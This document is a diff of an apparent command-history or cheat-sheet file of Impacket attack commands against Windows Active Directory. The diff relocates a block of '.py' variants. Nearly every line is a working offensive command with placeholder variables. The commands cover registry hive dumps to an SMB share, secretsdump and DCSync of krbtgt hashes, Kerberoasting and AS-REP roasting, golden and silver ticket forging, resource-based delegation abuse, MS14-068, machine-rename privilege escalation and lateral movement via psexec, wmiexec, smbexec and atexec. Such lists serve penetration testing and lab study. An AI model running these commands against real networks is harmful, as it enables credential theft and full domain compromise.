@@ -1,124 +1,3 @@
-findDelegation.py -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\192.168.56.1\SHUTDOWN'
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\192.168.56.1\SHUTDOWN'
-smbserver.py -smb2support NIHIL .
-secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
-secretsdump.py -ntds ntds.dit.save -system system.save LOCAL
-secretsdump.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
-secretsdump.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-secretsdump.py -k "$TARGET"
-secretsdump.py -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-secretsdump.py -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST"
-secretsdump.py -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
-secretsdump.py -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-secretsdump.py -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-KRB5CCNAME="$CCACHE_PATH" getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
-getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
-getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'nihil4thewin'
-getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
-getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
-renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
-renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
-ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "$DC_IP" "$DOMAIN"/
-GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD" -target-domain "$TARGET_DOMAIN"
-GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
-GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
-GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
-addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
-addcomputer.py -delete -computer-name 'SHUTDOWN$' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
-dacledit.py -action write -rights DCSync -principal 'owneduser' -target-dn 'DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
-wmiexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-wmiexec.py -codec cp850 -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-wmiexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-wmiexec.py -k "$TARGET"
-ticketer.py -nthash "$NT_HASH" -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain "$DOMAIN" randomuser
-ticketer.py -nthash "$NT_HASH" -spn HOST/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
-smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-smbexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-smbexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-smbexec.py -share 'ADMIN$' -k "$TARGET"
-rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
-rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
-rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
-rbcd.py -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
-lookupsid.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" 0
-lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST" 0
-psexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-psexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-dcomexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-atexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-atexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-changepasswd.py -newpass '123Pentest!!!' "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
-changepasswd.py -newpass '123Pentest!!!' -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET_OBJECT" "$DOMAIN"/"$USER":"$PASSWORD"
-mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-describeTicket.py "$CCACHE_PATH"
-describeTicket.py "$KRB5CCNAME"
-proxychains atexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains dcomexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains psexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains secretsdump.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-secretsdump.py -k -outputfile "$DOMAIN" "$DC_HOST"
-rpcdump.py @"$IP" | egrep 'MS-RPRN|MS-PAR'
-mssqlclient.py "$USER":"$PASSWORD"@"$IP" -p 1433
-mssqlclient.py -p 1433 "$USER"@"$IP" -windows-auth
-mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
-GetNPUsers.py -dc-ip "$IP" "$DOMAIN/" -usersfile "$USERLIST" -format hashcat -outputfile asreproast.txt
-GetNPUsers.py -usersfile "$USERLIST" -request -format hashcat -outputfile asrep.txt -dc-ip "$IP" -no-pass "$DOMAIN/$USER"
-GetUserSPNs.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD" -request
-GetUserSPNs.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD" -request -outputfile kerb.txt
-psexec.py "$DOMAIN/$USER"@"$IP" -hashes :"$NT_HASH"
-psexec.py administrator:"$PASSWORD"@"$IP"
-psexec.py "$DOMAIN"/"$USER"@"$IP" -hashes :"$NT_HASH"
-wmiexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
-dcomexec.py -object MMC20 "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
-getTGT.py "$DOMAIN/$USER:$PASSWORD" -dc-ip "$IP"
-getTGT.py "$DOMAIN/$USER" -hashes :"$NT_HASH" -dc-ip "$IP"
-getST.py "$DOMAIN/$USER" -impersonate "$TARGET_USER" -dc-ip "$IP" -spn "CIFS/DC"
-ticketer.py -nthash "$NT_HASH" -domain "$DOMAIN" -domain-sid "$DOMAIN_SID" -extra-sid "$PARENT_SID"-519 "$DUMMY_USER"
-ticketer.py -nthash "$NT_HASH" -spn "$HOST"/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
-secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
-secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc
-secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$TARGET_USER"
-secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$DOMAIN"/krbtgt
-secretsdump.py -k -no-pass "$DOMAIN/$USER@DC" -dc-ip "$IP" -target-ip "$IP"
-secretsdump.py -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$IP"
-owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
-dacledit.py -action read -dc-ip "$IP" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
-dacledit.py -action write -rights DCSync -principal "$USER" -target-dn 'DC=domain,DC=local' "$DOMAIN/$USER:$PASSWORD"
-changepasswd.py -newpass "$NEW_PASSWORD" "$DOMAIN/$USER:$PASSWORD"@"$IP"
-changepasswd.py -newpass "$NEW_PASSWORD" -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$TARGET"
-findDelegation.py "$DOMAIN/$USER:$PASSWORD"
-findDelegation.py -user "$TARGET_USER" "$DOMAIN/$USER:$PASSWORD"
-addcomputer.py -computer-name "$COMPUTER_NAME$" -computer-pass "$PASSWORD" -dc-host "$TARGET" -domain-netbios "$DOMAIN" "$DOMAIN/$USER:$PASSWORD"
-addcomputer.py -delete -computer-name "$COMPUTER_NAME$" -dc-host "$TARGET" -domain-netbios "$DOMAIN" "$DOMAIN/$USER:$PASSWORD"
-rbcd.py -delegate-from "$COMPUTER_NAME$" -delegate-to "$TARGET\$" -action write "$DOMAIN/$USER:$PASSWORD" -dc-ip "$IP"
-rbcd.py -delegate-to "$TARGET\$" -dc-ip "$IP" -action read "$DOMAIN/$USER:$PASSWORD"
-getST.py "$DOMAIN/$COMPUTER_NAME$" -spn "cifs/$TARGET" -impersonate "$ADMIN_USER" -dc-ip "$IP"
-getST.py -self -impersonate Administrator -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$IP" "$DOMAIN/$TARGET\$"
-renameMachine.py -current-name "$COMPUTER_NAME$" -new-name "$TARGET" -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
-lookupsid.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
-lookupsid.py "$DOMAIN/$USER:$PASSWORD"@"$IP" | grep "Domain SID"
-raiseChild.py -target-exec "$TARGET" "$DOMAIN/$USER"
-secretsdump.py -just-dc-ntlm "$DOMAIN/$DUMMY_USER@$TARGET" -k -no-pass -target-ip "$TARGET"
-findDelegation.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
-psexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
-wmiexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP" "$COMMAND"
-dcomexec.py -object MMC20 "$DOMAIN/$USER:$PASSWORD"@"$IP"
-atexec.py -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$TARGET"
-mssqlclient.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
-mssqlclient.py "$USER@$IP" -windows-auth
-proxychains psexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
-proxychains wmiexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
 rbcd -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
@@ -292,3 +171,124 @@ mssqlclient "$DOMAIN/$USER:$PASSWORD"@"$IP"
 mssqlclient "$USER@$IP" -windows-auth
 proxychains psexec "$DOMAIN/$USER:$PASSWORD"@"$IP"
 proxychains wmiexec "$DOMAIN/$USER:$PASSWORD"@"$IP"
+findDelegation.py -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\192.168.56.1\SHUTDOWN'
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\192.168.56.1\SHUTDOWN'
+smbserver.py -smb2support NIHIL .
+secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+secretsdump.py -ntds ntds.dit.save -system system.save LOCAL
+secretsdump.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
+secretsdump.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump.py -k "$TARGET"
+secretsdump.py -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump.py -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST"
+secretsdump.py -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
+secretsdump.py -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump.py -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+KRB5CCNAME="$CCACHE_PATH" getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
+getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
+getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'nihil4thewin'
+getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
+renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
+renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
+ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "$DC_IP" "$DOMAIN"/
+GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD" -target-domain "$TARGET_DOMAIN"
+GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
+GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
+addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
+addcomputer.py -delete -computer-name 'SHUTDOWN$' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
+dacledit.py -action write -rights DCSync -principal 'owneduser' -target-dn 'DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
+wmiexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+wmiexec.py -codec cp850 -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+wmiexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+wmiexec.py -k "$TARGET"
+ticketer.py -nthash "$NT_HASH" -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain "$DOMAIN" randomuser
+ticketer.py -nthash "$NT_HASH" -spn HOST/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
+smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+smbexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+smbexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+smbexec.py -share 'ADMIN$' -k "$TARGET"
+rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
+rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
+rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
+rbcd.py -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
+lookupsid.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" 0
+lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST" 0
+psexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+psexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+dcomexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+atexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+atexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+changepasswd.py -newpass '123Pentest!!!' "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
+changepasswd.py -newpass '123Pentest!!!' -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET_OBJECT" "$DOMAIN"/"$USER":"$PASSWORD"
+mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+describeTicket.py "$CCACHE_PATH"
+describeTicket.py "$KRB5CCNAME"
+proxychains atexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains dcomexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains psexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains secretsdump.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+secretsdump.py -k -outputfile "$DOMAIN" "$DC_HOST"
+rpcdump.py @"$IP" | egrep 'MS-RPRN|MS-PAR'
+mssqlclient.py "$USER":"$PASSWORD"@"$IP" -p 1433
+mssqlclient.py -p 1433 "$USER"@"$IP" -windows-auth
+mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+GetNPUsers.py -dc-ip "$IP" "$DOMAIN/" -usersfile "$USERLIST" -format hashcat -outputfile asreproast.txt
+GetNPUsers.py -usersfile "$USERLIST" -request -format hashcat -outputfile asrep.txt -dc-ip "$IP" -no-pass "$DOMAIN/$USER"
+GetUserSPNs.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD" -request
+GetUserSPNs.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD" -request -outputfile kerb.txt
+psexec.py "$DOMAIN/$USER"@"$IP" -hashes :"$NT_HASH"
+psexec.py administrator:"$PASSWORD"@"$IP"
+psexec.py "$DOMAIN"/"$USER"@"$IP" -hashes :"$NT_HASH"
+wmiexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+dcomexec.py -object MMC20 "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+getTGT.py "$DOMAIN/$USER:$PASSWORD" -dc-ip "$IP"
+getTGT.py "$DOMAIN/$USER" -hashes :"$NT_HASH" -dc-ip "$IP"
+getST.py "$DOMAIN/$USER" -impersonate "$TARGET_USER" -dc-ip "$IP" -spn "CIFS/DC"
+ticketer.py -nthash "$NT_HASH" -domain "$DOMAIN" -domain-sid "$DOMAIN_SID" -extra-sid "$PARENT_SID"-519 "$DUMMY_USER"
+ticketer.py -nthash "$NT_HASH" -spn "$HOST"/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
+secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc
+secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$TARGET_USER"
+secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$DOMAIN"/krbtgt
+secretsdump.py -k -no-pass "$DOMAIN/$USER@DC" -dc-ip "$IP" -target-ip "$IP"
+secretsdump.py -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$IP"
+owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
+dacledit.py -action read -dc-ip "$IP" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
+dacledit.py -action write -rights DCSync -principal "$USER" -target-dn 'DC=domain,DC=local' "$DOMAIN/$USER:$PASSWORD"
+changepasswd.py -newpass "$NEW_PASSWORD" "$DOMAIN/$USER:$PASSWORD"@"$IP"
+changepasswd.py -newpass "$NEW_PASSWORD" -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$TARGET"
+findDelegation.py "$DOMAIN/$USER:$PASSWORD"
+findDelegation.py -user "$TARGET_USER" "$DOMAIN/$USER:$PASSWORD"
+addcomputer.py -computer-name "$COMPUTER_NAME$" -computer-pass "$PASSWORD" -dc-host "$TARGET" -domain-netbios "$DOMAIN" "$DOMAIN/$USER:$PASSWORD"
+addcomputer.py -delete -computer-name "$COMPUTER_NAME$" -dc-host "$TARGET" -domain-netbios "$DOMAIN" "$DOMAIN/$USER:$PASSWORD"
+rbcd.py -delegate-from "$COMPUTER_NAME$" -delegate-to "$TARGET\$" -action write "$DOMAIN/$USER:$PASSWORD" -dc-ip "$IP"
+rbcd.py -delegate-to "$TARGET\$" -dc-ip "$IP" -action read "$DOMAIN/$USER:$PASSWORD"
+getST.py "$DOMAIN/$COMPUTER_NAME$" -spn "cifs/$TARGET" -impersonate "$ADMIN_USER" -dc-ip "$IP"
+getST.py -self -impersonate Administrator -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$IP" "$DOMAIN/$TARGET\$"
+renameMachine.py -current-name "$COMPUTER_NAME$" -new-name "$TARGET" -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
+lookupsid.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+lookupsid.py "$DOMAIN/$USER:$PASSWORD"@"$IP" | grep "Domain SID"
+raiseChild.py -target-exec "$TARGET" "$DOMAIN/$USER"
+secretsdump.py -just-dc-ntlm "$DOMAIN/$DUMMY_USER@$TARGET" -k -no-pass -target-ip "$TARGET"
+findDelegation.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
+psexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+wmiexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP" "$COMMAND"
+dcomexec.py -object MMC20 "$DOMAIN/$USER:$PASSWORD"@"$IP"
+atexec.py -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$TARGET"
+mssqlclient.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+mssqlclient.py "$USER@$IP" -windows-auth
+proxychains psexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+proxychains wmiexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
